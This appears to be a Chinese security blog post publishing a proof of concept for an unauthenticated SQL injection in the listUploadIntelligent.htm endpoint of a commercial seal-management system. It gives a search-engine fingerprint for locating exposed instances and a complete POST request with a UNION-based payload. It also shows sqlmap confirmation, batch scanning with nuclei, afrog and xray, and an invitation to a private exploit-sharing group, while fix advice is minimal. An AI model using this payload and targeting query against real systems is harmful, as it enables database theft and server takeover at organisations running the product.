#  【漏洞复现】某管家 listUploadIntelligent.htm SQL注入漏洞   
Superhero  Nday Poc   2024-08-24 18:04  
  
**0x00 免责声明**  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
**0x01 产品简介**  
  
  
某管家是一款集智能印章管理系统、APP、智能终端设备于一体的印章智慧管理解决方案，由上海某业信息科技股份有限公司推出。该产品旨在通过智能化手段，解决企业实体印章使用与管理的难点与痛点，提升印章管理的安全性和效率，为企业印章管理提供了强有力的支持。  
  
**0x02 漏洞概述**  
  
  
某管家 listUploadIntelligent.htm 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
**0x03 搜索引擎**  
```
body="章管家登录-公章在外防私盖"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKj82a85bxQaZTOELDP3vYkVlZhQeGwibkuM8q2VXoicYN5gSl7iakM26dGoUYtffhcrCxFg14abXhRg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
POST /app/message/listUploadIntelligent.htm?token=dingtalk_token HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Connection: close
 
person_id=1&unit_id=1&pageNo=1&is_read=-1 union select version(),2,3,4,5,6,7,8,9,10,11,12 --
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKj82a85bxQaZTOELDP3vYkhYkkDthnJu5nqsjTAY6ibDcskwSKALLnzWhFibz4SO7MQp07oBsedP5A/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKj82a85bxQaZTOELDP3vYk5HHo8dqQlRwH3hqyJcgJYefBoibCLD6zicfCDNPnxtJMtTeG8dCTKibAg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKj82a85bxQaZTOELDP3vYkGkyHsX56U6o8xrLCFXBwSibK204yZLcxTh8AttQOZJ3j8XsWS91ayhQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKj82a85bxQaZTOELDP3vYk0x7YS6O0tfYFoia9ib50ACrHGO11sJiaAaqkKwrNmayG4iaibBTHPwk1zQg/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKj82a85bxQaZTOELDP3vYkibklurCibaHSpia3icn2QrjzY1OmUoO1pHGk9hfrpXCFrOXIgTV31R0N2A/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露  
面或接口设置访问权限  
  
2、厂商已提供漏洞修补方案，请关注厂商主页及时更新：  
  
https://www.zhangin.com/  
  
  
